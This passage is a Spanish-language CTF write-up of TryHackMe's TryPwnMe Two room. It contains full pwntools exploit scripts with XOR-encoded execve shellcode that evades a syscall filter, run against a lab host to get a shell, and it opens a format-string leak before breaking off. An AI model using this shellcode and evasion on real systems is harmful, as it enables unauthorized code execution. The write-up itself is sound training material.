@@ -1,0 +1,1495 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup TryHackMe TryPwnMe Two</title>
+
+  <meta name="description" content="Resolución de la sala TryPwnMe Two de la plataforma de TryHackMe">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup TryHackMe TryPwnMe Two">
+  <meta name="twitter:description" content="Resolución de la sala TryPwnMe Two de la plataforma de TryHackMe">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/tryhackme/trypwnmetwo.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup TryHackMe TryPwnMe Two">
+  <meta property="og:description" content="Resolución de la sala TryPwnMe Two de la plataforma de TryHackMe">
+  <meta property="og:image" content="/images/tryhackme/trypwnmetwo.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/tryhackme/trypwnmetwo.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup TryHackMe TryPwnMe Two" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/tryhackme" title="xchg2pwn" class="blog-button">TryHackMe</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#tryexecme2">TryExecMe 2</a></li>
+        <li><a href="#notspecified2">Not Specified 2</a></li>
+        <li><a href="#tryanote">Try a Note</a></li>
+        <li><a href="#slowserver">Slow Server</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">TryHackMe</h4>
+    <picture><img src="/images/tryhackme/trypwnmetwo.png" style="float: right; margin-right:0px; margin-left:0px; height:80px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">TryPwnMe Two</h2><br>
+  </header>
+  
+<section class="post" id="tryexecme2">
+<br><h3 class="post-title">TryExecMe 2</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./tryexecme2</span><span class="p">
+                       ,---.
+                       /    |
+                      /     |
+                     /      |
+                    /       |
+               ___,'        |
+             <  -'          :
+              `-.__..--'``-,_\_
+                 |o/ ` :,.)_`>
+                 :/ `     ||/)
+                 (_.).__,-` |\
+                 /( `.``   `| :
+                 \'`-.)  `  ; ;
+                 | `       /-<
+                 |     `  /   `.
+ ,-_-..____     /|  `    :__..-'\
+/,'-.__\\  ``-./ :`      ;       \
+`\ `\  `\\  \ :  (   `  /  ,   `. \
+  \` \   \\   |  | `   :  :     .\ \
+   \ `\_  ))  :  ;     |  |      ): :
+  (`-.-'\ ||  |\ \   ` ;  ;       | |
+   \-_   `;;._   ( `  /  /_       | |
+    `-.-.// ,'`-._\__/_,'         ; |
+       \:: :     /     `     ,   /  |
+        || |    (        ,' /   /   |
+        ||                ,'   /    |
+
+Give me your spell, and I will execute it:  
+AAAAAAAABBBBBBBB
+
+Executing Spell...
+
+Segmentation fault (core dumped)</span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/1.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/1.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/2.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/2.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/3.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/3.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/4.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/4.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ disasm</span><span class="p"> -c amd64 0f05
+   0:    0f 05                    </span><span class="ve">syscall  </span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/5.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/5.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ disasm </span><span class="p">-c amd64 0f34
+   0:    0f 34                    </span><span class="ve">sysenter  </span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/6.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/6.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ disasm </span><span class="p">-c amd64 cd80
+   0:    cd 80                    </span><span class="ve">int</span><span class="az">    0x80  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> tryexecme2
+[</span><span class="az">*</span><span class="p">] '/home/user/tryexecme2'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="ve">Full RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ve">PIE enabled</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from</span><span class="p"> pwn </span><span class="o">import</span><span class="p"> gdb, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./tryexecme2"</span><span class="p">,</span><span class="s"> "b *main+163</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"...</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000565391c1e585 </span><span class="p">in</span><span class="am"> main </span><span class="p">()  
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x565391c1e585</span><span class="p"> &lt</span><span class="am">main</span><span class="p">+163>:  </span><span class="ve"> call</span><span class="ro">   rdx</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> si
+</span><span class="az">0x00000000cafe0000 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/8i $rip
+=> </span><span class="az">0xcafe0000</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0001</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0002</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0003</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0004</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0005</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0006</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+   </span><span class="az">0xcafe0007</span><span class="p">:  </span><span class="ve">nop</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, context, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./tryexecme2"</span><span class="p">)
+context.arch</span><span class="o"> = </span><span class="s">"amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()  </span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"...</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './tryexecme2': pid 2729
+[</span><span class="az">*</span><span class="p">] Process './tryexecme2' stopped with exit code 1 (pid 2729)  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+Forbidden spell detected!
+[</span><span class="az">*</span><span class="p">] Got EOF while reading in interactive
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, context, asm, xor
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./tryexecme2"</span><span class="p">,</span><span class="s"> "b *main+163</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()</span><span class="p">
+
+shellcode</span><span class="o"> = </span><span class="p">xor(shellcode,</span><span class="mi"> 0x1</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x15"</span><span class="p">)</span><span class="c1">               # $rsp = len(shellcode)</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rcx"</span><span class="p">)</span><span class="c1">                 # $rcx = counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add edi, 0x8"</span><span class="p">)</span><span class="c1">            # $rdi = shellcode start</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x17"</span><span class="p">)</span><span class="c1">              # jump xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span><span class="c1">                      # save xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor byte ptr [rdi], 0x1"</span><span class="p">)</span><span class="c1"> # restore xored byte</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"dec cl"</span><span class="p">)</span><span class="c1">                  # decrease counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc edi"</span><span class="p">)</span><span class="c1">                 # increase address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jrcxz $-0x1c"</span><span class="p">)</span><span class="c1">            # if $rcx == 0 -> exec shellcode</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $-0x9"</span><span class="p">)</span><span class="c1">               # if $rcx != 0 -> loop to decode</span><span class="p">  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"...</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0000559765566585 </span><span class="p">in</span><span class="am"> main</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> si
+</span><span class="az">0x00000000cafe0000</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/5i $rip
+=> </span><span class="az">0xcafe0000</span><span class="p">:</span><span class="ve">  push</span><span class="az">   0x15</span><span class="p">
+   </span><span class="az">0xcafe0002</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    rcx</span><span class="p">
+   </span><span class="az">0xcafe0003</span><span class="p">:</span><span class="ve">  add</span><span class="ro">    edi</span><span class="p">,</span><span class="az">0x8</span><span class="p">
+   </span><span class="az">0xcafe0006</span><span class="p">:</span><span class="ve">  jmp</span><span class="az">    0xcafe001d</span><span class="p">
+   </span><span class="az">0xcafe0008</span><span class="p">:</span><span class="ve">  imul</span><span class="ro">   edi</span><span class="p">,DWORD PTR [</span><span class="ro">rdx</span><span class="p">],</span><span class="az">0x59</span><span class="p">  
+</span><span class="ro">pwndbg> </span><span class="p">x/5i 0xcafe001d
+   </span><span class="az">0xcafe001d</span><span class="p">:</span><span class="ve">  xor</span><span class="p">    BYTE PTR [</span><span class="ro">rdi</span><span class="p">],</span><span class="az">0x1</span><span class="p">
+   </span><span class="az">0xcafe0020</span><span class="p">:</span><span class="ve">  dec</span><span class="ro">    cl</span><span class="p">
+   </span><span class="az">0xcafe0022</span><span class="p">:</span><span class="ve">  inc</span><span class="ro">    edi</span><span class="p">
+   </span><span class="az">0xcafe0024</span><span class="p">:</span><span class="ve">  jrcxz</span><span class="az">  0xcafe0008</span><span class="p">
+   </span><span class="az">0xcafe0026</span><span class="p">:</span><span class="ve">  jmp</span><span class="az">    0xcafe001d</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> b *0xcafe0008
+Breakpoint 2 at </span><span class="az">0xcafe0008</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> c
+Continuing.
+
+Breakpoint 2, </span><span class="az">0x00000000cafe0008</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/10i $rip
+=></span><span class="az"> 0xcafe0008</span><span class="p">:</span><span class="ve">  push</span><span class="az">   0x3b</span><span class="p">
+   </span><span class="az">0xcafe000a</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    rax</span><span class="p">
+   </span><span class="az">0xcafe000b</span><span class="p">:</span><span class="ve">  movabs</span><span class="ro"> rdi</span><span class="p">,</span><span class="az">0x68732f6e69622f</span><span class="p">  
+   </span><span class="az">0xcafe0015</span><span class="p">:</span><span class="ve">  push</span><span class="ro">   rdi</span><span class="p">
+   </span><span class="az">0xcafe0016</span><span class="p">:</span><span class="ve">  push</span><span class="ro">   rsp</span><span class="p">
+   </span><span class="az">0xcafe0017</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    rdi</span><span class="p">
+   </span><span class="az">0xcafe0018</span><span class="p">:</span><span class="ve">  cdq</span><span class="p">
+   </span><span class="az">0xcafe0019</span><span class="p">:</span><span class="ve">  push</span><span class="ro">   rdx</span><span class="p">
+   </span><span class="az">0xcafe001a</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    rsi</span><span class="p">
+   </span><span class="az">0xcafe001b</span><span class="p">:</span><span class="ve">  syscall</span><span class="p">
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, context, asm, xor
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"10.10.212.25"</span><span class="p">,</span><span class="mi"> 5002</span><span class="p">)
+context.arch</span><span class="o"> =</span><span class="s"> "amd64"</span><span class="p">
+
+shellcode</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x3b"</span><span class="p">)</span><span class="c1">                 # execve() NR</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rax"</span><span class="p">)</span><span class="c1">                   # $rax = execve()</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"mov rdi, 0x68732f6e69622f"</span><span class="p">)</span><span class="c1"> # $rdi = "/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdi"</span><span class="p">)</span><span class="c1">                  # $rsp = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rsp"</span><span class="p">)</span><span class="c1">                  # &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rdi"</span><span class="p">)</span><span class="c1">                   # $rdi = &"/bin/sh"</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"cdq"</span><span class="p">)</span><span class="c1">                       # $rdx = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push rdx"</span><span class="p">)</span><span class="c1">                  # $rsp = &0x0</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rsi"</span><span class="p">)</span><span class="c1">                   # $rdi = NULL</span><span class="p">
+shellcode</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"syscall"</span><span class="p">)</span><span class="c1">                   # system call execve()</span><span class="p">
+
+shellcode</span><span class="o"> = </span><span class="p">xor(shellcode,</span><span class="mi"> 0x1</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"push 0x15"</span><span class="p">)</span><span class="c1">               # $rsp = len(shellcode)</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"pop rcx"</span><span class="p">)</span><span class="c1">                 # $rcx = counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"add edi, 0x8"</span><span class="p">)</span><span class="c1">            # $rdi = shellcode start</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $+0x17"</span><span class="p">)</span><span class="c1">              # jump xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span><span class="c1">                      # save xored shellcode</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"xor byte ptr [rdi], 0x1"</span><span class="p">)</span><span class="c1"> # restore xored byte</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"dec cl"</span><span class="p">)</span><span class="c1">                  # decrease counter</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"inc edi"</span><span class="p">)</span><span class="c1">                 # increase address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jrcxz $-0x1c"</span><span class="p">)</span><span class="c1">            # if $rcx == 0 -> exec shellcode</span><span class="p">  
+payload</span><span class="o"> +=</span><span class="p"> asm(</span><span class="s">"jmp $-0x9"</span><span class="p">)</span><span class="c1">               # if $rcx != 0 -> loop to decode</span><span class="p">  
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, payload)
+shell.recvuntil(</span><span class="no">b</span><span class="s">"...</span><span class="mi">\n\n</span><span class="s">"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.212.25 on port 5002: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span><span class="p"> id
+uid=1000 gid=1000 groups=1000
+</span><span class="ro">$</span><span class="p"> cat flag.txt
+THM{TryExecMe-reveng3-with-no-s1sc4lls-nic3}
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+<section class="post" id="notspecified2">
+<br><h3 class="post-title">Not Specified 2</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./notspecified2</span><span class="p">
+  _______ _    _ __  __
+ |__   __| |  | |  \/  |
+    | |  | |__| | \  / |
+    | |  |  __  | |\/| |
+    | |  | |  | | |  | |
+    |_|  |_|  |_|_|  |_|
+
+Please provide your username:  
+AAAAAAAABBBBBBBB
+Thanks AAAAAAAABBBBBBBB</span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/7.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/7.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/8.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/8.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> notspecified2
+[</span><span class="az">*</span><span class="p">] '/home/user/notspecified2'
+    Arch:       amd64-64-little
+    RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="ve">NX enabled</span><span class="p">
+    PIE:        </span><span class="ro">No PIE (0x3fe000)  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./notspecified2</span><span class="p">
+  _______ _    _ __  __
+ |__   __| |  | |  \/  |
+    | |  | |__| | \  / |
+    | |  |  __  | |\/| |
+    | |  | |  | | |  | |
+    |_|  |_|  |_|_|  |_|
+
+Please provide your username:
+%p.%p.%p
+Thanks 0x7ffd149937c0.(nil).0x7f2e197c6a37  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q notspecified2
+Reading symbols from </span><span class="ve">notspecified2</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">notspecified2</span><span class="p">)  
+</span><span class="ro">pwndbg></span><span class="p"> b *main+135
+Breakpoint 1 at </span><span class="az">0x401307</span><span class="p">
+</span><span class="ro">pwndbg> </span><span class="p">r
+Starting program: </span><span class="ve">/home/user/notspecified2</span><span class="p">
+  _______ _    _ __  __
+ |__   __| |  | |  \/  |
+    | |  | |__| | \  / |
+    | |  |  __  | |\/| |
+    | |  | |  | | |  | |
+    |_|  |_|  |_|_|  |_|
+
+Please provide your username:
+%3$p
+Thanks 0x7ffff7ea7a37
+
